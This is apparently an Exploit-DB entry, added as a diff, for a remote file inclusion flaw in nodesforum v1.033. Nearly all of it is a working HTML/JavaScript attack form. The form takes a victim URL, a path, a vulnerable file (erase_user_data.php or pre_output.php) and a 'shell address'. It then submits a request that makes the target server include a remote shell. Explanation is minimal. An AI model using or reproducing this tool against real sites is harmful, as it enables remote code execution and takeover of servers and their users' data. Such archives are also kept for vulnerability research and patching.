@@ -1,0 +1,79 @@
+# Title: nodesforum v1.033 Remote File Inclusion Vulnerability
+# EDB-ID: 12047
+# CVE-ID: ()
+# OSVDB-ID: ()
+# Author: ItSecTeam
+# Published: 2010-04-04
+# Verified: yes
+# Download Exploit Code
+# Download Vulnerable app
+
+view source
+print?
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=windows-1254&quot;&gt;
+&lt;title&gt;coded by ahmadbady&lt;/title&gt;
+ 
+&lt;script language=&quot;JavaScript&quot;&gt;
+ 
+//===========================================================================
+//( #Topic    : nodesforum_1.033
+//( #Bug type : multi remote file include
+//( #Advisory :
+//===========================================================================
+//( #Author : ItSecTeam
+//( #Email  : Bug@ITSecTeam.com
+//( #Website: http://www.itsecteam.com
+//( #Forum  : http://forum.ITSecTeam.com
+//vuls---------------------------------------------------------------------
+//erase_user_data.php line 6;
+//pre_output.php line 16 ;
+//--------------------------------------------------------------------------
+ 
+var variable1 =&quot;?_nodesforum_path_from_here_to_nodesforum_folder=&quot;
+var variable2 =&quot;?_nodesforum_code_path=&quot;
+   
+ function it(){
+  if (xpl.file.value==&quot;pre_output.php&quot;){
+          variable1 = variable2;
+          
+                              }
+                xpl.action= xpl.victim.value+xpl.path.value+xpl.file.value+variable1+xpl.shell.value;xpl.submit();                                       
+            }
+&lt;/script&gt;
+ 
+&lt;/head&gt;
+ 
+&lt;body bgcolor=&quot;#FFFFFF&quot;&gt;
+ 
+&lt;p align=&quot;left&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;vul1 file:/path/erase_user_data.php&lt;/font&gt;&lt;/p&gt;
+&lt;p align=&quot;left&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;vul2 file:/path/pre_output.php&lt;/font&gt;&lt;/p&gt;
+&lt;p align=&quot;left&quot;&gt;&lt;font color=&quot;#0000FF&quot;&gt;-----------------------------------&lt;/font&gt;&lt;/p&gt;
+&lt;form method=&quot;post&quot; name=&quot;xpl&quot; onSubmit=&quot;it();&quot;&gt;
+    &lt;p align=&quot;left&quot;&gt;
+    &lt;font
+size=&quot;2&quot; face=&quot;Tahoma&quot;&gt;
+    victim:
+    &lt;input type=&quot;text&quot; name=&quot;victim&quot; size=&quot;20&quot;;&quot; style=&quot;color: #FFFFFF; background-color: #000000&quot;&gt;
+    path:
+    &lt;input type=&quot;text&quot; name=&quot;path&quot; size=&quot;20&quot;;&quot; style=&quot;color: #FFFFFF; background-color: #000000&quot;&gt;
+    file:
+    &lt;input type=&quot;text&quot; name=&quot;file&quot; size=&quot;20&quot;;&quot; style=&quot;color: #FFFFFF; background-color: #000000&quot;&gt;
+    shell address:
+    &lt;input type=&quot;text&quot; name=&quot;shell&quot; size=&quot;20&quot;;&quot; style=&quot;color: #FFFFFF; background-color: #000000&quot;&gt;&lt;/p&gt;
+    &lt;/p&gt;
+&lt;center&gt;
+ 
+&lt;/p&gt;
+  &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;GO&quot; name=&quot;B1&quot; style=&quot;float: left&quot;&gt;&lt;input type=&quot;reset&quot;
+value=&quot;reset&quot; name=&quot;B2&quot; style=&quot;float: left&quot;&gt;&lt;/p&gt;
+&lt;/form&gt;
+&lt;p&gt;&lt;br&gt;
+ &lt;/p&gt;
+&lt;/center&gt;
+&lt;/body&gt;
+ 
+&lt;/html&gt;
+
+
